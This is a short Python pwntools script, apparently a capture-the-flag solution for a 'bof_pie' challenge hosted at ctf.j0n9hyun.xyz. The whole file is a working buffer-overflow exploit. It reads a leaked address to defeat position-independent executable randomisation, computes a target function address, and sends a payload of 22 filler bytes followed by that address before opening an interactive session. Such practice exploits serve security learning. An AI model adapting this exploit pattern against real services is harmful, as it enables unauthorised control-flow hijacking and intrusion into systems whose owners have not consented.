from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3008)
# p = process('./bof_pie')

p.recvuntil('j0n9hyun is ')
j = int(p.recv(10), 16)

welcome = j - 0x79

payload = b"A" * 22 + p32(welcome)

p.sendline(payload)

p.interactive()
